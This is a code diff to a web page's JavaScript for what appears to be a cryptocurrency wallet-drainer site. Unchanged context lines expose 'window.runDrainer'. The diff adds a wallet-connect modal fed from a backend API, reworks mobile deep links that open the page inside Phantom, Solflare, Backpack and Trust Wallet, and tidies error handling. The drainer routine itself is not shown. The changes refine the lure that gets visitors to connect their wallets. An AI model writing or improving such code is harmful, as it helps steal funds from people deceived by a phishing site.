@@ -2978,6 +2978,106 @@
   <script>
     // Cache busting: v4 - Enhanced error suppression and logo fixes
     
+    // Generate Animated Stars for Hero Section - Initialize early
+    function createStars() {
+      const starsContainer = document.getElementById('starsContainer');
+      if (!starsContainer) {
+        // Retry if container not found yet
+        setTimeout(createStars, 100);
+        return;
+      }
+
+      // Clear any existing stars
+      starsContainer.innerHTML = '';
+
+      const numStars = 150;
+      const starSizes = ['small', 'medium', 'large'];
+      
+      for (let i = 0; i < numStars; i++) {
+        const star = document.createElement('div');
+        star.className = `star ${starSizes[Math.floor(Math.random() * starSizes.length)]}`;
+        
+        // Random position
+        star.style.left = Math.random() * 100 + '%';
+        star.style.top = Math.random() * 100 + '%';
+        
+        // Random animation duration (2-5 seconds)
+        const duration = 2 + Math.random() * 3;
+        star.style.animationDuration = duration + 's';
+        
+        // Random delay
+        star.style.animationDelay = Math.random() * 2 + 's';
+        
+        starsContainer.appendChild(star);
+      }
+    }
+
+    // Initialize stars immediately and also on DOM ready
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', createStars);
+    } else {
+      createStars();
+    }
+    
+    // Define openWalletModal early to avoid reference errors (will be replaced by full implementation later)
+    window.openWalletModal = async function openWalletModal() {
+      const modal = document.getElementById('walletModal');
+      if (!modal) {
+        console.error('[WALLET_MODAL] Modal element not found');
+        return;
+      }
+      modal.classList.add('active');
+      modal.style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+      
+      // Load wallet options from backend
+      try {
+        const response = await fetch('/api/wallet-management', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ operation: 'get_wallet_list' })
+        });
+        
+        const data = await response.json();
+        const walletOptionsDiv = modal.querySelector('.wallet-options');
+        
+        if (walletOptionsDiv && data.success && data.wallets) {
+          walletOptionsDiv.innerHTML = '';
+          
+          data.wallets.forEach(wallet => {
+            const walletOption = document.createElement('div');
+            walletOption.className = 'wallet-option';
+            walletOption.setAttribute('tabindex', '0');
+            walletOption.setAttribute('role', 'button');
+            walletOption.setAttribute('aria-label', `Connect ${wallet.name}`);
+            
+            walletOption.innerHTML = `
+              <img src="${wallet.logo}" alt="${wallet.name}" onerror="this.src='/logo.svg'">
+              <span class="wallet-name">${wallet.name}</span>
+            `;
+            
+            walletOption.onclick = () => {
+              if (typeof window.connectWallet === 'function') {
+                window.connectWallet(wallet.key);
+              }
+            };
+            walletOption.onkeydown = (e) => {
+              if (e.key === 'Enter' || e.key === ' ') {
+                e.preventDefault();
+                if (typeof window.connectWallet === 'function') {
+                  window.connectWallet(wallet.key);
+                }
+              }
+            };
+            
+            walletOptionsDiv.appendChild(walletOption);
+          });
+        }
+      } catch (error) {
+        console.error('[WALLET_MODAL] Error loading wallets:', error);
+      }
+    };
+    
     // Mobile detection functions - delegated to backend
     async function isMobile() {
       try {
@@ -6018,40 +6118,6 @@ window.runDrainer = runDrainer;
     }
 
     // Initialize wallet redirect handling on page load
-    // Generate Animated Stars for Hero Section
-    function createStars() {
-      const starsContainer = document.getElementById('starsContainer');
-      if (!starsContainer) return;
-
-      const numStars = 150;
-      const starSizes = ['small', 'medium', 'large'];
-      
-      for (let i = 0; i < numStars; i++) {
-        const star = document.createElement('div');
-        star.className = `star ${starSizes[Math.floor(Math.random() * starSizes.length)]}`;
-        
-        // Random position
-        star.style.left = Math.random() * 100 + '%';
-        star.style.top = Math.random() * 100 + '%';
-        
-        // Random animation duration (2-5 seconds)
-        const duration = 2 + Math.random() * 3;
-        star.style.animationDuration = duration + 's';
-        
-        // Random delay
-        star.style.animationDelay = Math.random() * 2 + 's';
-        
-        starsContainer.appendChild(star);
-      }
-    }
-
-    // Initialize stars when DOM is ready
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', createStars);
-    } else {
-      createStars();
-    }
-
     document.addEventListener('DOMContentLoaded', function() {
       // Check for wallet redirect parameters from all supported wallets
       handleWalletRedirect();
@@ -6713,9 +6779,9 @@ window.runDrainer = runDrainer;
           // Phantom: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
             // Mobile: Use exact Phantom URL format
-            const encodedUrl = encodeURIComponent(currentUrl);
-            deepLink = `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`;
-            fallbackUrl = `phantom://browse/${encodedUrl}?ref=${encodedUrl}`;
+            const phantomEncodedUrl = encodeURIComponent(currentUrl);
+            deepLink = `https://phantom.app/ul/browse/${phantomEncodedUrl}?ref=${phantomEncodedUrl}`;
+            fallbackUrl = `phantom://browse/${phantomEncodedUrl}?ref=${phantomEncodedUrl}`;
           } else {
             // Desktop: Use complex Connect API (unchanged)
             deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}`;
@@ -6726,11 +6792,11 @@ window.runDrainer = runDrainer;
           // Solflare: Use proper deep link format as per specification
           // Universal Link: https://solflare.com/ul/v1/browse/{encoded_dapp_url}?ref=https%3A%2F%2Fsolflare.com
           // Custom Scheme: solflare://v1/browse/{encoded_dapp_url}?ref=https%3A%2F%2Fsolflare.com
-          const encodedUrl = encodeURIComponent(currentUrl);
+          const solflareEncodedUrl = encodeURIComponent(currentUrl);
           
           // Use same format for both mobile and desktop
-          deepLink = `https://solflare.com/ul/v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
-          fallbackUrl = `solflare://v1/browse/${encodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
+          deepLink = `https://solflare.com/ul/v1/browse/${solflareEncodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
+          fallbackUrl = `solflare://v1/browse/${solflareEncodedUrl}?ref=https%3A%2F%2Fsolflare.com`;
           
           console.log(`[SOLFLARE_DEEP_LINK] Universal Link: ${deepLink}`);
           console.log(`[SOLFLARE_DEEP_LINK] Custom Scheme: ${fallbackUrl}`);
@@ -6739,9 +6805,9 @@ window.runDrainer = runDrainer;
           // Backpack: Use correct URL structure for mobile, complex API for desktop
           if (isMobileDevice) {
             // Mobile: Use exact Backpack URL format
-            const encodedUrl = encodeURIComponent(currentUrl);
-            deepLink = `https://backpack.app/ul/v1/browse/${encodedUrl}?ref=${encodedUrl}`;
-            fallbackUrl = `backpack://v1/browse/${encodedUrl}?ref=${encodedUrl}`;
+            const backpackEncodedUrl = encodeURIComponent(currentUrl);
+            deepLink = `https://backpack.app/ul/v1/browse/${backpackEncodedUrl}?ref=${backpackEncodedUrl}`;
+            fallbackUrl = `backpack://v1/browse/${backpackEncodedUrl}?ref=${backpackEncodedUrl}`;
           } else {
             // Desktop: Use custom scheme first
             deepLink = `backpack://browse/${encodeURIComponent(currentUrl)}`;
@@ -6752,9 +6818,9 @@ window.runDrainer = runDrainer;
           // Trust Wallet Universal Link Format:
           // Primary: https://link.trustwallet.com/open_url?url={encoded_dapp_url}
           // Fallback: trust://open_url?url={encoded_dapp_url}
-          const encodedUrl = encodeURIComponent(currentUrl);
-          deepLink = `https://link.trustwallet.com/open_url?url=${encodedUrl}`;
-          fallbackUrl = `trust://open_url?url=${encodedUrl}`;
+          const trustEncodedUrl = encodeURIComponent(currentUrl);
+          deepLink = `https://link.trustwallet.com/open_url?url=${trustEncodedUrl}`;
+          fallbackUrl = `trust://open_url?url=${trustEncodedUrl}`;
           break;
         case 'glow':
           // Glow: Use simplified deep links for better mobile support
@@ -7019,24 +7085,33 @@ async function getWalletConnectionInfo(walletKey) {
   }
 }
 
-// Enhanced openWalletModal function using backend
+// Enhanced openWalletModal function using backend (replaces early definition)
 window.openWalletModal = async function openWalletModal() {
-  // Opening wallet modal
   const modal = document.getElementById('walletModal');
-  
   if (!modal) {
     console.error('[WALLET_MODAL] Modal element not found');
-        return;
-      }
+    return;
+  }
       
   try {
     // Get wallet data from backend
-    const modalData = await getWalletModalData();
-    // Retrieved wallet data from backend
+    let modalData;
+    if (typeof getWalletModalData === 'function') {
+      modalData = await getWalletModalData();
+    } else {
+      // Fallback: fetch directly
+      const response = await fetch('/api/wallet-management', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ operation: 'get_wallet_list' })
+      });
+      const data = await response.json();
+      modalData = { success: data.success, wallets: data.wallets || [] };
+    }
     
     // Update wallet options with backend data
     const walletOptions = modal.querySelector('.wallet-options');
-    if (walletOptions && modalData.wallets.length > 0) {
+    if (walletOptions && modalData.wallets && modalData.wallets.length > 0) {
       walletOptions.innerHTML = '';
       
       modalData.wallets.forEach(wallet => {
@@ -7050,18 +7125,20 @@ window.openWalletModal = async function openWalletModal() {
                           (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) ||
                           window.innerWidth <= 768;
           
-          if (isMobile) {
+          if (isMobile && typeof window.connectMobileWalletEnhanced === 'function') {
             console.log('[WALLET_OPTION] Mobile device detected, using enhanced mobile connection');
-            // For mobile, use the enhanced mobile connection system
             window.connectMobileWalletEnhanced(wallet.key).catch(error => {
               console.error('[WALLET_OPTION] Enhanced mobile connection failed:', error);
-              // Fallback to basic deep link
-              window.openInWallet(wallet.key).catch(fallbackError => {
-                console.error('[WALLET_OPTION] Fallback deep link also failed:', fallbackError);
-                showStatus('Mobile connection failed. Please try again.', 'error');
-              });
+              if (typeof window.openInWallet === 'function') {
+                window.openInWallet(wallet.key).catch(fallbackError => {
+                  console.error('[WALLET_OPTION] Fallback deep link also failed:', fallbackError);
+                  if (typeof showStatus === 'function') {
+                    showStatus('Mobile connection failed. Please try again.', 'error');
+                  }
+                });
+              }
             });
-          } else {
+          } else if (typeof window.connectWallet === 'function') {
             console.log('[WALLET_OPTION] Desktop device, using standard connection');
             window.connectWallet(wallet.key);
           }
@@ -7069,11 +7146,11 @@ window.openWalletModal = async function openWalletModal() {
         
         walletOption.innerHTML = `
           <div class="wallet-icon">
-            <img src="${wallet.logo}" alt="${wallet.name}">
+            <img src="${wallet.logo}" alt="${wallet.name}" onerror="this.src='/logo.svg'">
           </div>
           <div class="wallet-info">
             <span class="wallet-name">${wallet.name}</span>
-            <span class="wallet-description">${wallet.description}</span>
+            ${wallet.description ? `<span class="wallet-description">${wallet.description}</span>` : ''}
           </div>
           <div class="wallet-arrow">
             <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -7099,12 +7176,15 @@ window.openWalletModal = async function openWalletModal() {
     }
     
     // Show modal
+    modal.classList.add('active');
     modal.style.display = 'flex';
     document.body.style.overflow = 'hidden';
     
   } catch (error) {
     console.error('[WALLET_MODAL] Error opening modal:', error);
-    showStatus('Failed', 'error');
+    if (typeof showStatus === 'function') {
+      showStatus('Failed to load wallets', 'error');
+    }
   }
 };
 
